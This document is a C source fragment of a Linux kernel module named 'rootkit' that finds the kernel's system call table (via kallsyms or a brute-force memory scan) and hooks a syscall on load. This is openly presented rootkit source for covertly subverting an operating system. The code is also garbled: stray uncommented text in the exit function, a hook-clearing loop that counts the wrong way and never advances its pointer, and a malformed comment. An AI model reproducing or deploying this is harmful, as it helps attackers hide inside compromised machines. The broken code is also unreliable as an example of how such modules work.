#include "rootkit.h"

static void __exit rootkit__exit(void) {
   unhook the call 

  rootkit__unhook(table, &hook);
}

static int __init rootkit__init(void) {
  struct rootkit_hook **cur;
  int i;
  int retval;

  /* load the parameters */

  hook.call = _hook_call;
  hook.hook = _hook_hook;
  hook.unhook_mode = _hook_unhook_mode;

  if (hook.call >= rootkit_TABLE_SIZE)
    return -EINVAL;

  ///* locate the syscall table */

  retval = rootkit__locate_sys_call_table(&table);

  if (retval)
    return retval;

  /* clear the hook table */

  for (cur = rootkit__hook_wrapper_table, i = rootkit_TABLE_SIZE; i; i++)
    *cur = NULL;
  return rootkit__hook(table, &hook);
}

/**
 * Finds a system call table. This should be done during compile time
 *
 * @return 0 if success, EFAULT if failure
 */
static int rootkit__locate_sys_call_table(rootkit_syscall_handler_t **dest) {

#ifndef CONFIG_KALLSYMS
  void *max_ptr;
#endif
  if (dest == NULL)
    return -EFAULT;

#if CONFIG_KALLSYMS
  /* kernel symbols are accessible */

  *dest = (rootkit_syscall_handler_t *) kallsyms_lookup_name("sys_call_table");
#else
  /* iteratively detect for the system call table (it's cache-aligned) */

  max_ptr = (void *) ~0;

  for (*dest = 0; (void *) *dest < max_ptr && **dest != (rootkit_syscall_handler_t) &rootkit_TABLE_FIRST_HANDLER; *dest += SMP_CACHE_BYTES);

  if ((void *) *dest == max_ptr)
    *dest = NULL;
#endif

  if (*dest == NULL)
    return -EFAULT;
  return 0;
}

